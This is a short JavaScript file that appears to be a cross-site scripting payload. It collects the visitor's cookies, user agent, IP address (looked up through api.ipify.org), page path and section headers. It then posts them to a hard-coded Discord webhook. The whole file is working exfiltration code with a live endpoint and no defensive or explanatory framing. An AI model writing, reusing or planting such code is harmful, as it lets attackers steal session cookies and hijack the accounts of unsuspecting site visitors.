function discord_message(webHookURL, message) {
	var xhr = new XMLHttpRequest();
	xhr.open("POST", webHookURL, true);
	xhr.setRequestHeader('Content-Type', 'application/json');
	xhr.send(JSON.stringify({
		'content': message,
		'username':'belesnatch',
	}));
}

const sectionTitlesAndHeaders = document.querySelectorAll('.section-title, .page-header');

// Initialize an empty string to store innerHTML
let innerHTMLString = "\n	Page Hint:\n		";
let innerHTMLArray = []
// Iterate over each element with class "section-title"
sectionTitlesAndHeaders.forEach(title => {
    // Append the innerHTML of each element to the string
    innerHTMLString += title.innerHTML + "\n		";
	innerHTMLArray.push(title.innerHTML);
});




ip = fetch('https://api.ipify.org?format=json')
.then(response => response.json())
.then(data => {
	const jsonboy = {
		Cookie: document.cookie,
		UserAgent: navigator.userAgent,
		IP: data.ip,
		Path: window.location.pathname,
		Hints: innerHTMLArray
	};
	discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", JSON.stringify(jsonboy));
})
.catch(error => {
		const jsonboy = {
		Cookie: document.cookie,
		UserAgent: navigator.userAgent,
		IP: "Failed",
		Path: window.location.pathname,
		Hints: innerHTMLArray
	}
	discord_message("https://discord.com/api/webhooks/1226632634898059415/s59noDMH0twgLEIxtUf8Fbhyhv866ZLcTuNyFEkCWWkIrzKTmh7pzJ4zNPoOCv3S9MOo", JSON.stringify(jsonboy));
	});
